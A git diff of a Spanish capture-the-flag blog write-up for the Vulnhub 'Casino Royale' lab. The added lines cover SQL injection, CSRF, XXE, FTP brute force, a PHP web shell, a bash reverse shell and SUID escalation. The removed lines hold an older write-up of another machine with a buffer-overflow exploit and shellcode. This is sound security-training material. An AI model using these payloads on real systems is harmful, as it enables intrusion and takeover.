@@ -2,7 +2,7 @@
 layout: single
 title: Casino Royale - Vulnhub
 excerpt: "Máquina linux de dificultad MEDIUM de la plataforma Vulnhub. Se tratan temas de SQLI, CSRF y permisos SUID"
-date: 2024-08-01
+date: 2024-07-31
 classes: wide
 header:
   teaser: /assets/images/vh-writeup-casino-royale/casinoRoyale.png
@@ -26,28 +26,28 @@ tags:
 
 <br/>
 
-Casino Royale es una máquina Linux de nivel medio que puede ser un reto interesante, pero también puede llevarte a perder tiempo en _rabbit holes_ debido a sus numerosas funcionalidades y páginas que no conducen a nada. A pesar de ello, existen varias formas de solucionar sus desafíos. En este post, compartiré la ruta que seguí, la cual es solo una de las muchas posibles para completar la máquina.
+Casino Royale es una máquina Linux de nivel medio que puede ser un reto realista, pero también puede llevarte a perder tiempo en _rabbit holes_ debido a sus numerosas funcionalidades y páginas que no conducen a nada. A pesar de ello, existen varias formas de solucionar sus desafíos. En este post, compartiré la ruta que seguí, la cual es solo una de las muchas posibles para completar la máquina.
 
 Ya que la enumeración es algo simple y en este caso tedioso, en la mayoría de casos me lo saltaré e iré directamente a las vulnerabilidades explicando cómo llegué a ellas.
 
-Por útlimo, en vez de usar la IP que tuvo mi máquina usaré `casino-royale.local` la cual cobrará tendrá mayor sentido después.
+Por útlimo, en vez de usar la IP que tuvo mi máquina usaré `casino-royale.local` la cual tendrá mayor sentido más adelante.
 
 ## Índice
 * [Fase de reconocimiento](#fase-de-reconocimiento)
   * [Reconocimiento de puertos y servicios](#reconocimiento-de-puertos-y-servicios)
 * [LeaderBoard](#leaderboard)
-* [Pokeradmin](#cms)
-* [Intelligence Upload Form](#intelligence-upload-form)
+* [Pokeradmin](#pokeradmin)
+* [Snowfox CMS](#snowfox-cms)
+* [Ultra access](#ultra-access)
 * [Escalada de privilegios](#escalada-de-privilegios)
-  * [Análisis del binario](#analisis-del-binario)
-  * [Buffer Overflow](#buffer-overflow)
 
 <a id="reconocimiento"></a>
 ## Fase de reconocimiento
 
 ### Reconocimiento de puertos y servicios
 
-Empezaremos utilizando `nmap` para descubrir los puertos abiertos accesibles(digo accesibles ya que la máquina puede tener más puertos abiertos pero que solo son accesibles desde la misma).
+Empezaremos utilizando `nmap` para descubrir los puertos abiertos accesibles.
+
 ```bash
 nmap -p- --open -sS --min-rate 5000 -Pn -n -v -oG allPorts -oN writeup casino-royale.local
 Nmap scan report for casino-royale.local
@@ -61,6 +61,8 @@ PORT     STATE SERVICE
 MAC Address: 08:00:27:F3:F5:0C (Oracle VirtualBox virtual NIC)
 
 ```
+
+Podemos observar varios servicios, siendo los más importantes: `ftp`, `smtp` y `http`.
 
 Una vez hemos visto que puertos están abiertos procedemos cuáles son esos servicios y su versión:
 
@@ -91,466 +93,229 @@ MAC Address: 08:00:27:F3:F5:0C (Oracle VirtualBox virtual NIC)
 
 Las versiones en este caso no son vulnerables.
 
-### LeaderBoard
+## LeaderBoard
 
 Una vez, escaneado los puertos procedemos a enumerar el servicio `http`. Si usamos alguna herramienta como `gobuster` podremos ver que existe un `index.php` (`http://casino-royale.local/index.php`).
 
-![](/assets/images/vh-writeup-imf/home.png)
+![](/assets/images/vh-writeup-casino-royale/leaderboard.png)
 
-Tras investigar por las diferentes páginas a las que podemos acceder y mirar su código `HTML` nos damos cuenta de lo siguiente:
+Si nos fijamos bien, hay una funcionalidad de filtrado de torneos:
 
-![](/assets/images/vh-writeup-imf/flag1_contact_php.png)
+![](/assets/images/vh-writeup-casino-royale/leaderboardFunctionality.png)
 
-En la página `contact.php` podemos ver la primera flag: `flag1{YWxsdGhlZmlsZXM=}`
+Si interceptamos la petición con burpsuite podemos ver que que viajan dos parámetros por _POST_: `op` y `tournamentid`:
 
-Si vemos que pone en el mensaje den base64: `allthefiles`
+![](/assets/images/vh-writeup-casino-royale/burpLeaderboard.png)
 
-Esto nos da una pista un poco rebuscada de en lo que debemos fijarnos. Si procedemos a fuzzear la página web en busca de otras rutas que no vemos no descubriremos mucho. El truco aquí está en fijarnos bien en los archivos que se importan en la página web.
+Si probamos vulnerabilidades en ambos parámetros, daremos con un SQL injection en el parámetro `torunamentid`. 
 
-En el código `html` de la página inicial vemos los siguientes archivos `.js`:
+Al explotar la vulnerabilidad nos damos cuenta que hay varias bases de datos en el servidor:
 
-![](/assets/images/vh-writeup-imf/base64-Flag2.png)
+![](/assets/images/vh-writeup-casino-royale/databases.png)
 
-El último archivo parece ser base64 ya que tiene `==` al final, pero los 3 son base64. No basta con traducirlos por separados, sino como decía la pista `allthefiles`, hay que juntar las 3 cadenas en orden y entonces, traducir el base64.
+La más importante es la base de datos `pokerleague` pero la de `vip` nos da información sobre otro lugar del sitio web que ya veremos más adelante.
 
-![](/assets/images/vh-writeup-imf/flag2.png)
+Dentro de la base de datos `pokerleague` encontraremos con una tabla `pokermax_admin` con las siguientes credenciales: `admin:raise12million`:
 
-Flag: `flag2{aW1mYWRtaW5pc3RyYXRvcg==}`
+![](/assets/images/vh-writeup-casino-royale/pokeradminCredentials.png)
 
-Vemos una nueva pista: `imfadministrator`
+## Pokeradmin
 
-> A partir de aquí usaré el dominio imf.local para referirme a la máquina
+En la fase de fuzzeo web, me encontré con el directorio `/pokeradmin`. Si nos dirigimos allí encontraremos el siguiente login:
 
-<a id="login"></a>
-## Login
+![](/assets/images/vh-writeup-casino-royale/login.png)
 
-Si usamos esta cadena como un directorio, encontraremos una nueva parte de la página web que hasta el momento estaba oculta: `http://imf.local/imfadministrator`
+Si probamos las credenciales anteriores accederemos como admin. 
 
-![](/assets/images/vh-writeup-imf/login.png)
+También podríamos burlar el login realizando un SQLI Bypass:
 
-Si probamos los usuarios que encontramos en la página `contact.php`, nos daremos cuenta de que `rmichaels` lo detecta como un usuario existente.
+![](/assets/images/vh-writeup-casino-royale/sqli%20bypass.png)
 
-Si miramos una vez más el código fuente veremos otra pista:
+Por último, una vez logueados, podemos observar la siguiente cookie:
 
-```html
-<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
+![](/assets/images/vh-writeup-casino-royale/adminCookie.png)
+
+Si probamos a setearnos esta cookie sin estar logueados y accedemos a `main.php`, nos dejará entrar sin pasar por el login.
+
+De esta página, lo que nos interesa es la información de los jugadores que se encuentra en `manage players` y la info la podemos consultar dándole al botón `Edit info`:
+
+![](/assets/images/vh-writeup-casino-royale/infoPlayers.png)
+
+La información que nos interesa se encuentra en el jugador Valenka:
+
+![](/assets/images/vh-writeup-casino-royale/infoValenka.png)
+
+Es el único que tiene email y habla sobre la ruta `/vip-client-portfolios/?uri=blog`. Esta ruta también la podríamos haber conseguido en la base de datos `vip` mencionada anteriormente que corresponde a la de esta sección de la página web. En esta base de datos se encuentran los usuarios y contraseña del blog, pero están hasheados y tienen aplicado un _salt_ por lo que es complicado crackearlos.
+
+En la información también hablan de que están en `casino-royale.local` que es como me he estado refiriendo a la máquina todo este tiempo. Si visitamos a `http://<ip>/vip-client-portfolios/?uri=blog` podremos observar que las imágenes no cargan. Para que lo hagan deberás de cambiar tu `/etc/hosts` para que `casino-royale.local` redirija a la ip de la máquina.
+
+## Snowfox CMS
+
+Si nos dirigimos a `http://casino-royale.local/vip-client-portfolios/?uri=blog` podremos ver lo siguiente:
+
+![](/assets/images/vh-writeup-casino-royale/snowFox.png)
+
+Si buscamos en `searchsploit` alguna vulnerabilidad de `Snowfox CMS` encontraremos lo siguiente:
+
+![](/assets/images/vh-writeup-casino-royale/searchsploit.png)
+
+Existe una vulnerabilidad de Cross-Site Request Forgery. Esta es una vulnerabilidad de tipo _Client Side_, es decir, es necesario de la interacción de un usuario para que se produzca.
+
+Si nos fijamos en el último post, podremos encontrar una pista:
+
+![](/assets/images/vh-writeup-casino-royale/postPista.png)
+
+Tenemos una manera para que un usuario administrador ejecute el CSRF. 
+
+Para ello:
+  - El email tiene que ir dirigido a valenka cuyo email está en `Pokeradmin` y es `valenka`
+  - En el asunto del email debe de estar un usuario, que será uno de los jugadores que vimos en `Pokeradmin`. En mi caso escogí a `obanno`.
+  - Poner un link, que lleve a una página que hosteemos nosotros que contendrá el código HTML malicioso con el CSRF.
+
+Comandos necesarios para enviar el correo:
+
+```smtp
+telnet <ip> 25
+mail from: nombre
+rcpt to: valenka
+data
+subject: obanno
+
+http://<nuestra ip>/mailicious.html
+
+.
+quit
 ```
 
-Esto, junto a que sabemos que la página está construida con `php`, nos hace pensar que el código se verá de la siguiente forma:
+> Se deben de respetar los saltos de línea.
+
+En el caso del HTML, me traje el que encontramos en `searchsploit` con:
+
+```bash
+searchspoit -m php/webapps/35301.html
+```
+
+Y lo renombré a `malicious.html`.
+
+>  Hay que adaptar el código a nuestro caso específico
+
+Luego hostee un servicio `http` con python en esa misma carpeta:
+
+```py
+python3 -m http.server 80
+```
+
+Después de que valenka caiga en el CSRF, podremos entrar en el sitio como el usuario que definimos en el `HTML` el cual tendrá privilegios de administrador.
+
+Una vez más, si nos dirigimos al apartado de los usuarios y vemos su información, obtendremos más pistas. En este caso, es el usuario `le` el que nos la da.
+
+![](/assets/images/vh-writeup-casino-royale/snowManageUsers.png)
+
+![](/assets/images/vh-writeup-casino-royale/leUser.png)
+
+En este caso, obtenemos una nueva ruta llamada `/ultra-access-view/main.php`.
+
+## Ultra access
+
+Si nos dirigimos a `http://casino-royale.local/ultra-access-view/main.php` nos aparecerá lo siguiente:
+
+![](/assets/images/vh-writeup-casino-royale/ultraAccess.png)
+
+Si vemos el código de la página veremos la siguiente pista:
+
+![](/assets/images/vh-writeup-casino-royale/pistaXML.png)
+
+Parece ser que acepta por `POST` la siguiente estructura XML:
+
+```xml
+<creds>
+  <customer>username</customer>
+  <password>password</password>
+</creds>
+```
+
+Si probamos a enviar esta estructura por `POST` veremos la siguiente respuesta:
+
+![](/assets/images/vh-writeup-casino-royale/xmlPost.png)
+
+Podemos ver que efectivamente la página web interpreta el username y lo refleja en la página web. Si probamos a hacer un XXE, veremos que es posible leer del fichero `/etc/passwd`:
+
+![](/assets/images/vh-writeup-casino-royale/xxe.png)
+
+Podemos observar que hay un usuario llamado `ftpUserULTRA`. Podemos intentar a crackear la contraseña del usuario con el diccionario `rockyou.txt` e `hydra` por el servicio ftp:
+
+```bash
+hydra -l ftpUserULTRA -P rockyou.txt ftp://<ip> -t 20
+```
+
+Da como resultado la contraseña `bankbank` y así podemos entrar en el servicio `ftp`.
+
+Hay que recalcar que si entramos en `http://casino-royal.local/ultra-access-view` entramos en una página de _directory listing_ que refleja los ficheros a los que vamos a acceder a continuación por ftp.
+
+Para poder ganar acceso a la máquina debemos de subir un archivo `php` por ftp. El mío será el siguiente:
 
 ```php
-$username = $_POST['username']
-$pass = $_POST['pass']
-
-if($username == 'rmichaels'){
-  if($pass == '******') {
-    // Garantizar el acceso al usuario
-  }
-}
-```
-> La contraseña no tiene por qué ser esa.
-
-Lo importante de este código reside en la comparativa. Si es cierto que en el código original se ha empleado el `==` en vez de `===` significa que el código es vulnerable a un **Type Juggling**.
-
-El **Type Juggling** consiste en que al comparar dos variables de diferente tipo (integer, string, array, etc.) puede llevar a confusión. Por ejemplo, si comparamos un string cualquiera con un array, el valor resultante siempre será `true`:
-
-```php
-'hello world' == [] // true
+<?php echo system($_GET['command']); ?>
 ```
 
-Si interceptamos la petición de login y modificamos el valor de password para que `php` lo interprete como un array ocurrirá lo siguiente:
+Si intentamos subirlo con el comando de `ftp` `mget` no nos dejará ya que aplica una blacklist de extensiones. Si cambiamos la extensión a `php3` si nos deja.
 
-![](/assets/images/vh-writeup-imf/flag3.png)
-
-Obtendremos acceso y la flag3: `flag3{Y29udGludWVUT2Ntcw==}`
-
-El base64 dice: `continueTOcms`
-
-Así que, tal y como dice la pista, iremos al apartado cms clickeando en el enlace.
-
-<a id="cms"></a>
-## CMS
-
-![](/assets/images/vh-writeup-imf/cms.png)
-
-Si clickeamos en los diferentes links, nos damos cuenta de que hay un parámetro `pagename` el cual se encarga de hacer que cambie la página. Si insertamos un `'` al final del valor, nos daremos cuenta de que es vulnerable a un **SQL Injection**:
-
-![](/assets/images/vh-writeup-imf/sqli.png)
-
-> El %27 es el carácter `'` en url-encoding
-
-Si guardamos la request sin el `'` con burpsuite y usamos `sqlmap.py` podremos dumpear la base de datos.
-
-> Para guardar una request de BurpSuite: Click derecho en la request -> Copy to file
-
-1. Primero vemos las bases de datos:
+Para que nos interprete el exploit necesitaremos dar permisos de lectura al archivo en el servidor `ftp` con:
 
 ```bash
-sqlmap -r req.req -p pagename --dbs --risk=3 --level=5
+chmod 777 exploit.php3
 ```
 
-> El archivo req.req es mi request
+Una vez hecho esto debemos de dirigirnos a nuestro exploit desde la url desde `http://casino-royal.local/ultra-access-view` y en mi caso escribir la siguiente reverse shell en bash:
 
-Y vemos que hay una base de datos llamada `admin` así que la usaremos para ver que tablas tiene.
-
-2. Ver las tablas de la base de datos `admin`:
-
-```bash
-sqlmap -r req.req -p pagename -D admin --tables --risk=3 --level=5
-```
-
-Vemos una tabla llamada pages.
-
-3. Vemos que columnas tiene:
-
-```bash
-sqlmap -r req.req -p pagename -D admin -T pages --columns --risk=3 --level=5
-```
-
-Vemos que tiene dos columnas: `pagedata` y `pagename`. Este último tiene el mismo nombre del parámetro por el cual estamos inyectando *SQL*. 
-
-4. Dumpeamos los pagenames para ver si hay alguno oculto:
-
-```bash
-sqlmap -r req.req -p pagename -D admin -T pages -C pagename --dump --columns --risk=3 --level=5
-```
-
-Nos damos cuenta de que efectivamente hay un pagename oculto: `tutorials-incomplete`.
-
-Si entramos en `http://imf.local/imfadministrator/cms.php?pagename=tutorials-incomplete` podemos ver una imagen con un QR.
-
-![](/assets/images/vh-writeup-imf/flag4.png)
-
-Si escaneamos este QR podemos ver la flag4: `flag4{dXBsb2Fkcjk0Mi5waHA=}`
-
-El base64 se decodifica como: `uploadr942.php`
-
-<a id="file-upload"></a>
-## Intelligence Upload Form
-
-Si accedemos a `http://imf.local/imfadministrator/uploadr942.php` podremos ver lo siguiente:
-
-![](/assets/images/vh-writeup-imf/upload%20form.png)
-
-Como el backend es `php` podemos intentar subir un código que nos permita ejecutar comandos:
-
-```php
-<?php echo system($_GET['cmd']); ?>
-```
-
-Esto nos permite ejecutar comandos con un parámetro `cmd`.
-
-Si intentamos subir este archivo `php` nos dirá que no se permiten este tipo de archivos. Para que nos permita subir este archivo, tenemos que interceptar la petición y cambiar lo siguiente:
-
-- El Content-Type a algo como `image/gif` en mi caso.
-- La extensión a `.gif`
-- Y el comienzo del archivo a `GIF8;`
-- Cambiar el `system` del script ya que lo detecta como malicioso. Para ello envuelve el `$_GET['cmd']` con \`\`.
-
-En mi caso lo hago con `.gif` ya que a la hora de referenciar este archivo podremos ver el resultado de los comandos.
-
-Este es el resultado:
-
-![](/assets/images/vh-writeup-imf/file%20upload.png)
-
-Como se puede ver, nos da un hash en la respuesta. Este será el nombre del archivo con el que se guardará. Si fuzzeamos en `imfadministrator` podremos encontrar la carpeta `uploads`.
-
-Si accedemos a `http://imf.local/imfadministrator/uploads/<hash>.gif?cmd=whoami` podremos ver lo siguiente:
-
-![](/assets/images/vh-writeup-imf/rce.png)
-
-Por lo tanto tenemos ejecución remota de comandos y podemos intentar entablar una `Reverse Shell` con la máquina víctima.
-
-El payload que usaré para ello será el siguiente
-
-- Comando a ejecutar en la máquina víctima:
 ```bash
 /bin/bash -c '/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1' 
 ```
-> [ip] corresponde con nuestra ip y [port] con el puerto que elijamos para ponernos en escucha
 
-- Comando a ejecutar en la máquina atacante:
+En burpsuite quedaría así:
+
+![](/assets/images/vh-writeup-casino-royale/rce.png)
+
+Yo usaré el puerto `443` para entablar la reverse shell:
+
 ```bash
-nc -nlvp [port]
+nc -nlvp 443
 ```
-> [port] corresponde con el puerto que elijamos para ponernos en escucha
 
-> Primero hay que ponerse en escucha antes de enviar la reverse shell
-
-Lo que estamos haciendo con estos comandos es ponernos en escucha en un puerto en la máquina del atacante y conectándonos por ese puerto en la máquina víctima y enviándonos una shell.
-
-Si ponemos el comando de la víctima en nuestro parámetro `cmd` y lo url-encodeamos quedaría de la siguiente manera:
-
-![](/assets/images/vh-writeup-imf/reverse-shell.png)
-
-En el directorio donde aparecemos hay un archivo donde se encuentra la flag:
-
-![](/assets/images/vh-writeup-imf/flag5.png)
-
-Flag: `flag5{YWdlbnRzZXJ2aWNlcw==}` -> `agentservices`
-
-Esta será la pista para la escalada de privilegios.
-
-<a id="escalada"></a>
 ## Escalada de privilegios
 
-Si seguimos la pista anterior y buscamos por archivos de con nombre `agent` podremos encontrar lo siguiente:
+Una vez en la máquina, buscamos por binarios con privilegios SUID:
+
+```
+find / -perm -4000 2>/dev/null
+```
+
+Y nos encontramos con lo siguiente:
+
+![](/assets/images/vh-writeup-casino-royale/suid.png)
+
+Es un archivo propio de la máquina. Si lo ejecutamos dice lo siguiente:
+
+![](/assets/images/vh-writeup-casino-royale/SUIDejecutado.png)
+
+Dice que necesita de un archivo `run.sh`. Probamos un archivo creado por nosotros con el mismo nombre y que contenga lo siguiente:
 
 ```bash
-find / -name agent 2>/dev/null
-/usr/local/bin/agent
-/etc/xinetd.d/agent
+#!/bin/bash
+
+bash -p
 ```
 
-Hay un binario llamado `agent`, pero no cuenta con permisos SUID o de algo que nos sirva de utilidad. Como la pista decía que era un servicio así que miramos que puertos están abiertos internamente:
+Si ejecutamos ahora el binario estaremos como `root`:
 
-```bash
-netstat -nat
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
-tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
-tcp        0    136 192.168.18.54:54428     192.168.18.43:443       ESTABLISHED
-tcp6       0      0 :::80                   :::*                    LISTEN     
-tcp6       0      0 :::22                   :::*                    LISTEN     
-tcp6       1      0 192.168.18.54:80        192.168.18.43:46604     CLOSE_WAIT
-```
+![](/assets/images/vh-writeup-casino-royale/root.png)
 
-Podemos ver un puerto `7788` que no es usado usualmente. El `3306` es el servidor `sql` y el `22` es ssh. Si nos conectamos a este puerto con `telnet` podemos ver lo siguiente:
+Por último, solo quedaría ver la flag:
 
-```bash
-telnet 0.0.0.0 7788
-Trying 0.0.0.0...
-Connected to 0.0.0.0.
-Escape character is '^]'.
-  ___ __  __ ___ 
- |_ _|  \/  | __|  Agent
-  | || |\/| | _|   Reporting
- |___|_|  |_|_|    System
+![](/assets/images/vh-writeup-casino-royale/flagBash.png)
 
+![](/assets/images/vh-writeup-casino-royale/flagFinal.png)
 
-Agent ID : 
-```
 
-Es el mismo panel del `/usr/local/bin/agent`:
 
-```bash
-/usr/local/bin/agent
-  ___ __  __ ___ 
- |_ _|  \/  | __|  Agent
-  | || |\/| | _|   Reporting
- |___|_|  |_|_|    System
 
-
-Agent ID : 
-```
-
-Podemos ver qué usuario está ejecutando este servicio podemos ver el contenido del otro archivo que encontramos al buscar por agent: `/etc/xinetd.d/agent`
-
-```bash
-cat /etc/xinetd.d/agent
-# default: on
-# description: The agent server serves agent sessions
-# unencrypted agentid for authentication.
-service agent
-{
-       flags          = REUSE
-       socket_type    = stream
-       wait           = no
-       user           = root
-       server         = /usr/local/bin/agent
-       log_on_failure += USERID
-       disable        = no
-       port           = 7788
-}
-```
-
-Aquí podemos observar que efectivamente el puerto `7788` ejecuta el binario que vimos y en el apartado `user` vemos que lo ejecuta `root`. Si tenemos alguna forma de aprovecharnos de este binario y ejecutar una shell estaremos como el usuario `root`.
-
-Para analizarlo mejor, nos lo traemos a nuestra máquina de atacante. Yo lo hago de la siguiente forma:
-
-- En la máquina víctima:
-```bash
-nc -n <mi ip> <un puerto mío> < /usr/local/bin/agent
-```
-
-- En mi máquina:
-```bash
-nc -nvlp <el mismo puerto mío> > agent
-```
-
-> Primero hay que ponerse en escucha en tu máquina antes de enviar el archivo
-
-- Comprobar la integridad del archivo:
-```
-md5sum agent
-```
-
-> Se compara el hash en las dos máquinas para ver si coincide
-
-<a id="analisis-del-binario"></a>
-### Análisis del binario
-
-Para el análisis del binario usaré [Ghidra]("https://ghidra-sre.org/") que debería de estar preinstalado en distribuciones como **Kali linux** y **Parrot OS**.
-
-Una vez abierto el programa, creamos un nuevo proyecto y arrastramos el binario dentro de la carpeta. Una vez aceptamos las ventanas que nos aparecen, arrastramos el binario al icono del dragón y le pedimos que nos analice el binario cuando nos lo pregunte.
-
-En la parte izquierda se encuentran todas las funciones y le damos click a main:
-
-![](/assets/images/vh-writeup-imf/click_menu.png)
-
-Ahora podemos ver la función main del programa:
-
-![](/assets/images/vh-writeup-imf/main.png)
-
-Podemos ver el menú de inicio que se printea, así que es señal de que estamos en el sitio correcto. 
-Si ejecutamos el binario podemos ver que nos pide un ID como login. Este ID se puede ver representado en el código:
-
-![](/assets/images/vh-writeup-imf/id.png)
-
-Primero se introduce en una función un número hexadecimal y luego compara la variable que coge nuestro input con esta cadena. Como se puede observar en la función `asprintf`, tiene un parámetro `%i` que indica que transforma el hexadecimal en número y luego lo guarda como string. Si hacemos click derecho en este valor podemos verlo como decimal:
-
-![](/assets/images/vh-writeup-imf/contraseña_agent.png)
-
-Si ejecutamos el binario y usamos este número como ID podemos ver que avanzamos en el programa a un menú con diferentes funciones.
-
-En Ghidra, podemos acceder a estas funciones desde el mismo panel del cual abrimos la función main. La función que nos interesa analizar es `report`. Lo interesante de esta función respecto a las demás es el uso de la función `get`. Esta función es un problema de seguridad en `c` ya que no controla el límite de la longitud de caracteres que intentas meter en el Buffer definido anteriormente:
-
-![](/assets/images/vh-writeup-imf/bof_ghidra.png)
-
-En este caso podemos ver que el tamaño del Buffer es de `164`. Si al ejecutar el script nos metemos en el apartado de `report` y como reporte metemos 200 caracteres podemos ver que nos da un `Segmentation Fault`, y por lo tanto es vulnerable a un **Buffer Overflow**.
-
-### Buffer Overflow
-
-#### Qué es un Buffer Overflow
-
-Como se ha dicho anteriormente, el **Buffer Overflow** ocurre cuando sobrepasas un buffer con una longitud limitada. Esto es crítico ya que al hacer esto, sobreescribes otras partes de la memoria pudiendo afectar a otros registros. 
-
-En el tipo de **Buffer Overflow** más simple, sobreescribimos el registro `EIP`. Este registro se encarga de guardar la siguiente "línea de código" que se va a ejecutar para redirigirlo a un código nuestro llamado `shellcode` y ejecutar comandos maliciosos como entablar una `Reverse shell` en nuestro caso.
-
-Nuestro plan será el siguiente:
-
-1. Ver cuantos caracteres son necesarios para sobreescribir el registro `EIP`
-2. Hallar un sitio para almacenar el `shellcode`
-3. Hallar en el binario una "línea de código" la cual apunte a nuestro `shellcode`. A esto lo llamaremos `OpCode`
-4. Hacer que el `EIP` apunte al `Opcode` y meter nuestro `shellcode`
-
-#### Explotación
-
-Para explotar el **Buffer Overflow** usaré el comando `gdb` junto con [peda](https://github.com/longld/peda). 
-
-##### Sobreescribiendo el EIP
-
-Primero de todo, vamos a ver cuantos caracteres son necesarios para sobreescribir el `EIP`:
-
-1. Primero ejecuto el gdb:
-
-```bash
-gdb agent -q
-```
-
-2. Ejecuto `pattern create 200` y copio el valor
-3. Luego corro el programa insertando `r`
-4. Uso el ID mencionado anteriormente y entro en el apartado de `report`
-5. Inserto el patrón creado
-6. Ejecuto `pattern offset $eip` para ver cuantos caracteres tengo que insertar para sobreescribir el registro `EIP` y me da un valor de `168`.
-
-![](/assets/images/vh-writeup-imf/gdb_eip_necesario.png)
-
-Si ahora ejecutamos el programa e insertamos en el reporte el carácter `A` 168 veces y luego 4 `B`, podemos ver que se sobreescribe el `EIP` con `42424242`. Por lo tanto es correcto.
-
-> 42 es B en ASCII
-
-##### Buscando un lugar para el shellcode
-
-Si miramos la región a donde apunta el registro `eax` con `x/16wx $eax` podemos ver que las `A` empiezan a aparecer por ahí. Por lo tanto nuestro payload tendrá la siguiente estructura:
-
-```py
-payload = shellcode + b"A" * (offset - len(shellcode)) + call_eax
-```
-
-Es decir, primero vendrá nuestro shellcode, luego se rellenará de `A` hasta llegar justo antes del `EIP` y luego el `EIP` se rellenará con una dirección que contenga la instrucción `call eax` para que se ejecute el shellcode que metimos anteriormente.
-
-##### Buscando el OpCode
-
-Para encontrar la llamada de `call eax` en el binario primero tenemos que saber su representación en hexadecimal:
-
-```bash
-/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-nasm > call eax
-00000000  FFD0              call eax
-```
-
-Ahora que lo sabemos lo buscamos con el siguiente comando:
-
-```bash
-objdump -d agent | grep -i "FF D0"
-8048563:	ff d0                	call   *%eax
-```
-
-Y vemos que se encuentra en 0x08048563. Esta dirección será a la que referenciamos en el `EIP`.
-
-##### Generando el shellcode
-
-Para genera el shellcode usé este comando:
-
-```bash
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -b '\x00\x0a\x0d' -f c
-```
-
-> En -b quité los BadChars que son más comunes
-
-##### Generando el exploit
-
-Sólo queda crear un script que se conecte al puerto interno `7788`, ponga el ID, elija la opción 3 e inserte el payload que acabamos de generar:
-
-```py
-from struct import pack
-import socket
-
-# Insertar tu payload
-shellcode =(b"\xdb\xd9\xbe\x39\x9b\xff\x1e\xd9\x74\x24\xf4\x5d\x29\xc9"
-b"\xb1\x12\x31\x75\x17\x83\xc5\x04\x03\x4c\x88\x1d\xeb\x9f"
-b"\x75\x16\xf7\x8c\xca\x8a\x92\x30\x44\xcd\xd3\x52\x9b\x8e"
-b"\x87\xc3\x93\xb0\x6a\x73\x9a\xb7\x8d\x1b\xdd\xe0\x7c\xf0"
-b"\xb5\xf2\x80\x02\x94\x7a\x61\xba\x7e\x2d\x33\xe9\xcd\xce"
-b"\x3a\xec\xff\x51\x6e\x86\x91\x7e\xfc\x3e\x06\xae\x2d\xdc"
-b"\xbf\x39\xd2\x72\x13\xb3\xf4\xc2\x98\x0e\x76")
-
-offset = 168
-
-# La dirección de "call eax" tiene que estar en Little Endian
-payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<L", 0x08048563) + b"\n"
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("127.0.0.1", 7788))
-
-# Recibimos el banner
-s.recv(1024)
-
-# Enviamos el ID
-id = b"48093572\n"
-s.send(id)
-
-# Recibimos: Login Validated
-s.recv(1024)
-
-# Recibimos el menú
-s.recv(1024)
-
-# Elegimos report
-s.send(b"3\n")
-
-# Recibimos el menú de report
-s.recv(1024)
-
-# Enviamos el payload
-s.send(payload)
-```
-
-Nos ponemos en escucha en la máquina del atacante por el puerto especificado en el shellcode y ejecutamos el script en la máquina víctima ganando acceso como root.
-
-En la carpeta `/root` podemos encontrar la flag final:
-
-![](/assets/images/vh-writeup-imf/final.png)
